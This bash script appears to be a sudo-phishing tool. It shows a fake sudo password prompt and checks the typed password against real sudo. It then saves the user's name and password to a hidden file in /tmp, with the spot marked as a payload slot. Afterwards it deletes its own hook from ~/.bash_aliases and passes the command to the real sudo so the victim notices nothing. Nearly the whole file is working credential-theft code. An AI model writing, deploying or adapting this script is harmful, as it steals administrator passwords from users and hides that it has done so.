# i="";
# for argument in "$@" 
# do
    
#     i+="${argument} ";
# done
# echo ""
# echo "python /tmp/sudo.py $i"
readonly INPUT_MESSAGE="[sudo] password for ${USER}: "


readonly MAXIMUM_ATTEMPTS=3
readonly ERROR_MESSAGE="sudo: ${MAXIMUM_ATTEMPTS} incorrect password attempts"

attempts() {
    echo "Running fake sudo"
    echo -n "${INPUT_MESSAGE}"
    read -r -s sudo_password
    echo ""
    if ( echo "${sudo_password}" | sudo -k -S true > /dev/null 2>&1 ); then
        ##
        # <YOUR-PAYLOAD>
        ##
        /bin/echo "${USER}:${sudo_password}"
        /bin/echo "${USER}:${sudo_password}" > /tmp/.sudo_password
        ##
        # </YOUR-PAYLOAD>
        ##
        # /bin/rm ~/.sudo_phishing.sh
        /usr/bin/head -n -1 ~/.bash_aliases > ~/.bash_aliases_bak
        /bin/mv ~/.bash_aliases_bak ~/.bash_aliases
        /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
        $BASH
        exit 0
    fi
}


for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
    attempts "${@}"
done
/bin/echo "${ERROR_MESSAGE}"
